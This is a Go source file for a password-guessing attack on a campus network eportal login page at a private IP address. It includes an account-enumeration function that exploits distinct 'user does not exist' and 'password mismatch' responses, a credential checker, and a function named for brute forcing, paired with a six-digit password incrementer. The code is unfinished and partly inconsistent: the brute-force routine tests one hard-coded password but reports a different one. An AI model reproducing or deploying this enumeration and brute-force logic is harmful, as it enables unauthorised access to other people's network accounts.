package main

import (
	"fmt"
	"net/http"
	"strings"
	purl "net/url"
	"io"
	"strconv"
)

var (
	loginurl = `http://172.17.0.3/eportal/InterFace.do?method=login`
)

func HttpPost(url string, userid string, pwd string) (retstr string, merr error) {
	client := &http.Client{}
	var clusterinfo = purl.Values{}
	clusterinfo.Add("userId", userid)
	clusterinfo.Add("password", pwd)
	clusterinfo.Add("operatorPwd", "")
	clusterinfo.Add("operatorUserId", "")
	clusterinfo.Add("validcode", "")
	clusterinfo.Add("service", "%E6%A0%A1%E5%86%85%E6%9C%8D%E5%8A%A1")
	clusterinfo.Add("queryString", "lanuserip%3D76ced83852c05fdc039ed9575376ef4f%26wlanacname%3D284b634df60c7ef2f96af6bdf4912f7b%26ssid%3D%26nasip%3D31794990ed84e290fc7bd9159798b1f8%26snmpagentip%3D%26mac%3D79e8d5a8a43191d6d3c8b8059e604047%26t%3Dwireless-v2%26url%3D2c0328164651e2b4f13b933ddf36628bea622dedcc302b30%26apmac%3D%26nasid%3D284b634df60c7ef2f96af6bdf4912f7b%26vid%3D2045636786f020c2%26port%3Da16fc4eb6656b1ea%26nasportid%3D5b9da5b08a53a540806c821ff7c1438120a6ffceb7ee444db82c1c4e4a2dce28")
	data := clusterinfo.Encode()
	reqest, err := http.NewRequest("POST", url, strings.NewReader(data))
	reqest.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	reqest.Header.Set("Referer", "http://172.17.0.3/eportal/index.jsp?wlanuserip=76ced83852c05fdc039ed9575376ef4f&wlanacname=284b634df60c7ef2f96af6bdf4912f7b&ssid=&nasip=31794990ed84e290fc7bd9159798b1f8&snmpagentip=&mac=79e7d5a8a43191d6d3ccb8059e604947&t=wireless-v2&url=2c0328164651e2b4f13b933ddf36628bea622dedcc302b30&apmac=&nasid=284b634df60c7ef2f96af6bdf4912f7b&vid=2045636786f020c2&port=a16fc4eb6656b1ea&nasportid=5b9da5b08a53a540806c821ff7c1438120a6ffceb7ee444db82c1c4e4a2dce28")
	if err != nil {
		fmt.Println("发送失败!")
		merr = err;
		return
		//panic(err)
	}
	//处理返回结果
	response, _ := client.Do(reqest)
	res := make([]byte, 2048)
	if _, merr = response.Body.Read(res); merr != nil && merr != io.EOF {
		//返回的状态码
		//status := response.StatusCode
		fmt.Println("解析结果失败:", merr)
		return
	}
	merr = nil
	retstr = string(res)
	fmt.Println(retstr)
	return
}

func isaccountexist(userid string) (ise bool, err error) {
	str, err := HttpPost(loginurl, userid, "2")
	if err != nil {
		fmt.Println(err)
		return
	} else {
		if strings.Index(str, "不存在") != -1 {
			ise = false
			return
		}
		if strings.Index(str, "密码不匹配") != -1 {
			ise = true
			return
		}
	}
	return
}

func ismatch(userid, pwd string) (ism bool, err error) {
	str, err := HttpPost(loginurl, userid, pwd)
	if err != nil {
		fmt.Println(err)
		return
	} else {
		if strings.Index(str, "不存在") != -1 {
			err = fmt.Errorf("用户名不存在")
			return
		}
		if strings.Index(str, "密码不匹配") != -1 {
			ism = false
			return
		}
		if strings.Index(str, `result":"success`) != -1 {
			ism = true
			return
		}
	}
	return
}

func baopo(userid string) (pwd string, err error) {
	ism := false
	cpwd := "000000"
	ism, err = ismatch(userid, "0210338")
	if err != nil {
		return
	}
	if ism {
		pwd = cpwd
		fmt.Println("暴破成功,密码:", cpwd)
		return
	}
	return
}
func addpwd(pwd string) (npwd string, err error) {
	n := 0
	n, err = strconv.Atoi(pwd)
	if err != nil {
		return
	}
	npwd = fmt.Sprintf("%06d", n+1)
	return
}
func main() {
	str, _ := addpwd("000000")
	fmt.Println("格式化结果:", str)
	//fmt.Printf("%06d",22)
}
